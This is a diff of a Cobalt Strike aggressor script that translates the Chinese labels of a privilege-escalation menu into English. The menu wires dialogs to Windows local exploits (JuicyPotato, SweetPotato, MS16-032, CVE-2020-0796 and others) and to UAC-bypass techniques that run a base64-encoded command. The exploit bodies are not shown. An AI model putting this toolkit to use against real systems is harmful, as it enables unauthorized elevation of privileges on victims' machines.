@@ -2,17 +2,17 @@
 #                            #
 #                            #
 #                            #
-#       Xway.cn@panda        #
+#       XWAY.CN@panda        #
 #                            #
 #                            #
 #                            #
 ##############################
-	menu "权限提升" {
+	menu "Privilege Escalation" {
 		  item "Watson" {
 			$bid = $1;
 			$dialog = dialog("Watson", %(bid => $bid), &Watson);
-			dialog_description($dialog, "获取可用于提权的漏洞。支持Windows 10 1507、1511、1607、1703、1709、1803、1809、windows server 2016和2019。");
-            dbutton_action($dialog, "运行");
+			dialog_description($dialog, "Check privilege escalation. Support Windows 10 1507,1511,1607,1703,1709,1803,1809 and Windows Server 2016,2019.");
+            dbutton_action($dialog, "RUN");
 			dialog_show($dialog);
         }
 sub Watson {
@@ -23,7 +23,7 @@ sub Watson {
                 $Dialog = dialog("Sweet Potato",%(bid => $bid),&SweetPotato);
                 dialog_description($Dialog, "MS16-075");
                 drow_listener($Dialog, "listener", "Listener: ");
-                dbutton_action($Dialog, "运行");
+                dbutton_action($Dialog, "RUN");
                 dialog_show($Dialog);
             }
 sub SweetPotato {
@@ -48,7 +48,7 @@ sub SweetPotato {
                 $Dialog = dialog("juicypotato",%(bid => $bid),&juicypotato);
                 dialog_description($Dialog, "juicypotato(ms16-075)");
                 drow_listener($Dialog, "listener", "Listener: ");
-                dbutton_action($Dialog, "运行");
+                dbutton_action($Dialog, "RUN");
                 dialog_show($Dialog);
             }
 sub juicypotato {
@@ -75,7 +75,7 @@ sub juicypotato {
                 $Dialog = dialog("MS14-058",%(bid => $bid),&ms14_058_exploit);
                 dialog_description($Dialog, "MS14-058");
                 drow_listener($Dialog, "listener", "Listener: ");
-                dbutton_action($Dialog, "运行");
+                dbutton_action($Dialog, "RUN");
                 dialog_show($Dialog);
             }
 
@@ -101,7 +101,7 @@ sub ms14_058_exploit {
                 $Dialog = dialog("MS15-051",%(bid => $bid),&ms15_051_exploit);
                 dialog_description($Dialog, "MS15-051");
                 drow_listener($Dialog, "listener", "Listener: ");
-                dbutton_action($Dialog, "运行");
+                dbutton_action($Dialog, "RUN");
                 dialog_show($Dialog);
             }
 sub ms15_051_exploit {
@@ -129,7 +129,7 @@ sub ms15_051_exploit {
                 $Dialog = dialog("MS16-016",%(bid => $bid),&ms16_016_exploit);
                 dialog_description($Dialog, "MS16-016");
                 drow_listener($Dialog, "listener", "Listener: ");
-                dbutton_action($Dialog, "运行");
+                dbutton_action($Dialog, "RUN");
                 dialog_show($Dialog);
             }
 sub ms16_016_exploit {
@@ -152,7 +152,7 @@ sub ms16_016_exploit {
                 $Dialog = dialog("MS16-032",%(bid => $bid),&ms16_032_exploit);
                 dialog_description($Dialog, "MS16-032");
                 drow_listener($Dialog, "listener", "Listener: ");
-                dbutton_action($Dialog, "运行");
+                dbutton_action($Dialog, "RUN");
                 dialog_show($Dialog);
             }
 sub ms16_032_exploit {
@@ -176,7 +176,7 @@ sub ms16_032_exploit {
                 $Dialog = dialog("MS16-135",%(bid => $bid),&ms16_135_exploit);
                 dialog_description($Dialog, "MS16-135");
                 drow_listener($Dialog, "listener", "Listener: ");
-                dbutton_action($Dialog, "运行");
+                dbutton_action($Dialog, "RUN");
                 dialog_show($Dialog);
             }
 sub ms16_135_exploit {
@@ -197,7 +197,7 @@ sub ms16_135_exploit {
                 $Dialog = dialog("cve_2020_0796_exploit",%(bid => $bid),&cve_2020_0796_exploit);
                 dialog_description($Dialog, "Windows 10 versions 1903 - 1909");
                 drow_listener($Dialog, "listener", "Listener: ");
-                dbutton_action($Dialog, "运行");
+                dbutton_action($Dialog, "RUN");
                 dialog_show($Dialog);
             }
 sub cve_2020_0796_exploit {
@@ -227,10 +227,10 @@ sub cve_2020_0796_exploit {
 			item "BypassUAC"{
 				$bid = $1;
 				$dialog = dialog("BypassUAC", %(cmd => "VALUE Base64 encoded command to execute",type => "eventvwr",bid => $bid), &BypassUAC);
-				dialog_description($dialog, "命令需进行base64编码,如:Y21kIC9jIHN0YXJ0IGNhbGMuZXhl,DiskCleanup的命令必须以“ && REM”结尾,如:Y21kIC9jIHN0YXJ0IGNhbGMuZXhlICYmIFJFTQ ==。");
-				drow_text($dialog, "cmd", "command:  ");				
+				dialog_description($dialog, "Command must be Base64 encoded.");
+				drow_text($dialog, "cmd", "command: ");				
 				drow_combobox($dialog, "type", "type:", @("eventvwr", "fodhelper","computerdefaults","sdclt","slui","dikcleanup"));
-				dbutton_action($dialog, "运行");
+				dbutton_action($dialog, "RUN");
 				dialog_show($dialog);
         }
 sub BypassUAC {
